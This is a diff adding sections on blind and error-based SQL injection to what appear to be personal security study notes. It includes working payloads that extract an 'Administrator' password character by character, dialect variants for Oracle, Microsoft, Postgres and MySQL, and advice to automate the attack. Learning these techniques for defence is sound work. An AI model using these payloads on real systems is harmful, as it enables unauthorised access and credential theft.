@@ -42,6 +42,38 @@ SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT use
 * Time delay of processing query
 * Out-of-band network ineraction
 
+#### Conditional responses
+Example:  
+Site uses tracking cookies with some token which is compared to tokens in DB and if it appears to be there, site returns hello message  
+If we add `AND '1'='1` nothing will change because it's True statement  
+But if we add `AND '1'='2` it will fail and we will detect Blind SQLi  
+We can use it to brute password symbol by symbol like this:
+```
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm        #returns True, meaning that 1 symbol of pass is greater then m
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't        #returns False, meaning that 1 symbol of pass is less then t
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's        #returns True, meaning that 1 symbol of pass is s
+```
+Note: SUBSTRING() function could be named SUBSTR() on some DBs  
+To check next symbol use SUBSTRING((...), 2, 1)  
+it's good idea to use Burp Intruder or Python script
+
+#### Error-based SQLi
+In such case we force DB to do smth which throws an error  
+For example we can force DB to try divide-by-zero:
+```
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a          # nothing happens, because 1=2 is False and we just evaluate a to a
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a          # we force DB to 1/0 because 1=1 is True
+```
+```
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+```
+In such case if 1 character of password is more then 'm', nothing happens. But if it's smaller, we force DB to 1/0, which throws an error  
+For different DBs:
+* Oracle: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual `
+* Microsoft: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END `
+* Postgres: `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`
+* MySQL: `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`
+
 ### Second-order SQLi
 SQLi which is stored inside server/database and executed later with another HTTP request. Also called stored SQLi  
 
@@ -122,5 +154,4 @@ Other DBs:
 * Microsoft: `'foo'+'bar'`
 * Postgres: `'foo'||'bar'`
 * MySQL: `'foo' 'bar'` (note the space) or `CONCAT('foo','bar')`
-
 
